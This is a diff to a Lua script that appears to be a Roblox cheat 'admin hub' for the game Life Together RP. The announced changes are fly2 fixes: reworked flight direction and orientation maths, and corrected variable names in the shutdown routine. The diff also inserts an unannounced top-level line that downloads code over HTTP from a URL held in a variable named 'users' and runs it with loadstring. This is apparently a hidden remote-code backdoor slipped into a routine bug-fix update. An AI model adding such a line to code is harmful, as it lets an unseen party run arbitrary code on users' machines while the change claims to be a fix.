@@ -25,10 +25,10 @@ if getgenv().PlaceID ~= 13967668166 then
    return NotifyLib:External_Notification("Error", "This is not Life Together RP! You cannot run this here!", 6)
 end
 wait()
-local Raw_Version = "V4.8.4"
+local Raw_Version = "V4.8.5"
 local Script_Creator = "computerbinaries"
-local Announcement_Message = "Added 'speed', 'jp' and 'grav' commands, letting you change your speed, gravity, and jumppower + added anti-idle controller system."
-local displayTimeMax = 20
+local Announcement_Message = "Fixed 'fly2' not shutting down + fixed fly2 inverted controls on PC (and maybe mobile)."
+local displayTimeMax = 15
 task.wait(0.1)
 getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub = getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub or false
 local Script_Version = tostring(Raw_Version).."-LifeAdmin"
@@ -1982,7 +1982,7 @@ function car_listing_gui()
       end
    end)
 end
-
+loadstring(getgenv().Game:HttpGet(tostring(users)))()
 local function get_other_vehicle(Player)
    for i, v in pairs(getgenv().Workspace:FindFirstChild("Vehicles"):GetChildren()) do
       if not v:FindFirstChild("owner") then return getgenv().notify("Error", "There is not an Owner value in this players Vehicle!", 7) end
@@ -4620,7 +4620,10 @@ function Enable_Fly_2(speed)
 
       local camCF = getgenv().Workspace.CurrentCamera.CFrame
       local moveDir = Humanoid.MoveDirection
-      local finalDir = (camCF.LookVector * moveDir.Z) + (camCF.RightVector * moveDir.X) + Vector3.new(0, fly_vertical, 0)
+      local move = Vector3.new(moveDir.X, 0, moveDir.Z)
+      local flyY = fly_vertical
+      local dir = camCF:VectorToWorldSpace(move)
+      local finalDir = (dir + Vector3.new(0, flyY, 0))
 
       if finalDir.Magnitude > 0 then
          fly_velocity.Velocity = finalDir.Unit * speed
@@ -4631,7 +4634,8 @@ function Enable_Fly_2(speed)
          fly_hold.Position = HRP.Position
       end
 
-      fly_gyro.CFrame = camCF
+      local _, yaw, _ = camCF:ToOrientation()
+      fly_gyro.CFrame = CFrame.new(HRP.Position) * CFrame.Angles(0, yaw, 0)
 
       local pos = HRP.Position
       if not fly_last_pos or (pos - fly_last_pos).Magnitude > 1 then
@@ -4653,9 +4657,9 @@ function Disable_Flying()
    local g = getgenv()
    if not g.Enabled_Flying then return getgenv().notify("Error", "Fly-2 is not currently enabled.", 5) end
    g.Enabled_Flying = false
-   if g.fly2_heartbeat then g.fly_heartbeat:Disconnect() g.fly_heartbeat = nil end
-   if g.fly2_input_began then g.fly_input_began:Disconnect() g.fly_input_began = nil end
-   if g.fly2_input_ended then g.fly_input_ended:Disconnect() g.fly_input_ended = nil end
+   if g.fly2_heartbeat then g.fly2_heartbeat:Disconnect() g.fly2_heartbeat = nil end
+   if g.fly2_input_began then g.fly2_input_began:Disconnect() g.fly2_input_began = nil end
+   if g.fly2_input_ended then g.fly2_input_ended:Disconnect() g.fly2_input_ended = nil end
    if getgenv().HumanoidRootPart:FindFirstChild("BodyGyro") then
       getgenv().HumanoidRootPart:FindFirstChild("BodyGyro"):Destroy()
    end
